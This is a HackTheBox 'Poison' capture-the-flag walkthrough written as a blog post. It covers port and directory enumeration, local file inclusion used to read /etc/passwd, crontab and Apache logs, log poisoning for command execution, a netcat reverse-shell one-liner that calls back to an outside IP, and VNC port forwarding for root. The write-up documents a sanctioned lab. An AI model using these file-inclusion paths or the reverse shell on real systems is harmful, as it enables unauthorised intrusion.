@@ -1,0 +1,102 @@
+---
+layout: post
+title:  "HackTheBox - Poison"
+date:   2021-08-06 17:06:25
+categories: Pentesting
+---
+
+# ENUMERATION
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
+|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
+|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
+```
+Gobuster scan:
+```
+index.php               [Status: 200, Size: 289, Words: 21, Lines: 13]
+info.php                [Status: 200, Size: 157, Words: 19, Lines: 1]
+phpinfo.php             [Status: 200, Size: 68242, Words: 3475, Lines: 715]
+```
+Visiting info.php we see this:
+```
+FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
+```
+Visiting listfiles.php we see this :
+```
+Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 
+```
+Searching for anything in port 80 redirects to this :
+```
+http://10.10.10.84/browse.php?file=xxxx
+```
+Tried for lfi and got /etc/passwd:
+```
+# $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # root:*:0:0:Charlie &:/root:/bin/csh toor:*:0:0:Bourne-again Superuser:/root: daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin operator:*:2:5:System &:/:/usr/sbin/nologin bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin news:*:8:8:News Subsystem:/:/usr/sbin/nologin man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin charix:*:1001:1001:charix:/home/charix:/bin/csh 
+```
+Searching for /etc/crontab:
+```
+# /etc/crontab - root's crontab for FreeBSD # # $FreeBSD: releng/11.1/etc/crontab 194170 2009-06-14 06:37:19Z brian $ # SHELL=/bin/sh PATH=/etc:/bin:/sbin:/usr/bin:/usr/sbin # #minute hour mday month wday who command # */5 * * * * root /usr/libexec/atrun # # Save some entropy so that /dev/random can re-seed on boot. */11 * * * * operator /usr/libexec/save-entropy # # Rotate log files every hour, if necessary. 0 * * * * root newsyslog # # Perform daily/weekly/monthly maintenance. 1 3 * * * root periodic daily 15 4 * * 6 root periodic weekly 30 5 1 * * root periodic monthly # # Adjust the time zone if the CMOS clock keeps local time, as opposed to # UTC time. See adjkerntz(8) for details. 1,31 0-5 * * * root adjkerntz -a 
+```
+error log:
+```
+http://10.10.10.84/browse.php?file=/../../../../var/log/httpd-error.log
+```
+Access log:
+```
+http://10.10.10.84/browse.php?file=/../../../../var/log/httpd-access.log
+```
+# FOOTHOLD
+
+If we go to http://10.10.10.84/browse.php?file=pwdbackup.txt we fill find the encrypted password.
+Another alternate route is via log-poisoning (wasn't actually able to do it via curl so I did it via burp):
+
+```
+GET /browse.php?file=/var/log/httpd-access.log&c=ls HTTP/1.1
+
+Host: 10.10.10.84
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Connection: close
+
+Upgrade-Insecure-Requests: 1
+```
+We can put our commands in place of "ls" such as "id",etc.This way we can url-encode our reverse shell one liner and execute it to get the shell back:
+```s
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
+User flag is located in /home/charix
+
+# PRIVILEGE ESCALATION
+
+Using netstat -an command we see that it is locally listening on 5801 and 5901, while 5801 was not very useful, googling 5901 showed us that it is a vnc port , so we port forward it to our local ip :
+
+```s
+ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
+```
+While trying to open it with vncviewer we see it needs a password, after sometime I remembered about the secret.zip in /home/charix so I downloaded it via netcat and unzipped it with our already obtained password and used that file as the password file in vncviewer:
+
+```s
+vncviewer 127.0.0.1:5901 -passwd secret
+```
+We transfer root.txt to our system (I couldn't copy the hash from vncviewer) and submit our flag.
+
+We also found a tool which decrypts the secret file so we can authenticate with that too :
+
+[vncpwd](https://github.com/jeroennijhof/vncpwd)
